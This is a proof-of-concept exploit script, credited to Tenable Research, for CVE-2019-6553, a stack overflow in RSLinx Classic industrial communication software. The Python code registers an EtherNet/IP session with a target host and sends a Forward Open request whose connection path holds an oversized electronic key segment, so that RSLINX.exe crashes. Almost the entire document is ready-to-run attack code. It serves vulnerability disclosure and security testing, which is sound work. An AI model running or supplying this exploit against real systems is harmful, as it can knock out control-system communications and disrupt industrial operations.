##
# Exploit Title: RSLinx Classic - stack overflow
# Date: 06/11/2019
# Exploit Author: Tenable Research
# CVE : CVE-2019-6553
# Advisory: https://www.tenable.com/security/research/tra-2019-11
# Affected Vendors/Device/Firmware:
#  - RSLinx Classic 4.10.00 and earlier
##

import sys, socket, binascii
from struct import *

def usage():
  print "usage  : "+sys.argv[0] + " <target_ip>  <target_port>"
  print "example: "+sys.argv[0] + " 192.168.1.123 44818"

def mk_msg(cmd, dlen=None,session=0, status=0, sender='\x00'*8, options=0, data=''):
  if dlen is None: dlen = len(data)
  return pack('<HHLL8sL', cmd, dlen, session, status, sender, options) + data

def mk_type(id, size=None, data=''):
  if size is None: size = len(data)
  return pack('<HH', id, size) + data 
   
  
if len(sys.argv) != 3:
  usage()
  sys.exit()

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

# Register Session
msg = mk_msg(cmd=0x65,data=pack('<HH',1,0))
s.send(msg)
res = s.recv(1024)
print binascii.hexlify(res)
cmd, dlen, session, status, sender, options = unpack('<HHLL8sL',res[0:24])
if(cmd != 0x65 or status != 0):
  print 'RegisterSession command failed.'
  s.close();
  sys.exit()


b2 =  '\x54'                # service code: Forward Open
                            # vulnerble function is also reachable via
                            # other services (i.e., 0x52, 0x53, etc.) 

b2 += '\x02'                # 2 req path segments 
b2 += '\x20\x06'            # class: Connection Manager
b2 += '\x24\x01'            # Instance 1
b2 += '\x00'                # priority/tick_time
b2 += '\xf9'                # timeout ticks
b2 += pack('<L',0x80000031) # O -> T network connection id 
b2 += pack('<L',0x80fe0030) # T -> O network connection id 
b2 += pack('<H',0x1337)     # connection serial number
b2 += pack('<H',0x1234)     # vendor id
b2 += pack('<L',0xdeadbeef) # originator serialnumber 
b2 += '\x00'                # connection timeout multiplier
b2 += '\x00\x00\x00'        # reserved
b2 += pack('<L',0x007a1200) # O -> T RPI
b2 += pack('<H',0x0001)     # O -> T connection param
b2 += pack('<L',0x007a1200) # T -> O RPI
b2 += pack('<H',0x0001)     # T -> O connection param
b2 += '\xa3'                # transport_type 

# Create a connection path
cp = '\x01\x00'  # Port Segment: port id 1, link addr 0x00

# Add a long Electronic Key Segment
cp_max = 0xff * 2;
eks_len = (cp_max - 6 - 2) / 2
eks = '\x34' + pack('<B',eks_len) + 'A' * eks_len * 2
cp += eks

# Add Class and Instance logical segments
cp += '\x20\x02\x24\x01'
 
if (len(cp) % 2): cp += '\x00'

cp_size = len(cp) / 2;

b2 += pack('<B',cp_size)    # connection path in wordsize 
b2 +=  cp                   # connection path

data =  pack('<L',0)        # interface
data += pack('<H',0)        # timeout 
data += pack('<H',2)        # number of items 
data += mk_type(0)          # address item
data += mk_type(id=0xb2, data=b2) # data item 

msg = mk_msg(cmd=0x6f,session=session,data=data)
s.send(msg)
# RSLINX.exe should die
res = s.recv(1024)
print binascii.hexlify(res)
